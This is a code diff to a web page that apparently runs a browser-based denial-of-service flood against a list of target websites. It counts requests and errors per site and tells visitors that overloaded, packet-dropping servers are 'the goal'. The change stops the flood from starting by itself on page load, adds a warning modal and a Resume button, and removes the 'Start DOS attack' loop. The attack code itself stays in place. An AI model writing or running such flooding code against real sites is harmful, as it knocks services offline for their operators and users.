@@ -137,7 +137,7 @@
     <h3>Session Status</h3>
     <p>The number of GET requests and error responses for each targeted website is shown below. Failure to fetch is normal! That means their servers are overloaded and dropping
         packets - which is the goal!</p>
-    <button type="button" class="btn btn-primary" onclick="togglePause();">Pause</button>
+    <button type="button" class="btn btn-primary" onclick="togglePause();">Resume</button>
     </div>
 
     <div id="stats" class="container">
@@ -363,9 +363,10 @@
         // initialize variables
         var urls = Object.keys(targets);
         var statRow = document.querySelector("#stats > .row");
+        var myModal = new bootstrap.Modal(document.getElementById('exampleModal'), {});
         var CONCURRENCY_LIMIT = 200;
         var queue = [];
-        var attack = true;
+        var attack = false;
 
         function togglePause () {
             if (attack) {
@@ -379,10 +380,6 @@
                 }
             }
         }
-        window.onload = togglePause();
-
-        var myModal = new bootstrap.Modal(document.getElementById('exampleModal'), {})
-        myModal.toggle();
 
         async function fetchWithTimeout(resource, options) {
             const controller = new AbortController();
@@ -457,10 +454,9 @@
             `;
         }
 
-        // Start DOS attack
-        for (var i=0; i<urls.length; i++) {
-            flood(i);
-        }
+        // Show warning window
+        myModal.toggle();
+
     </script>
 </body>
 
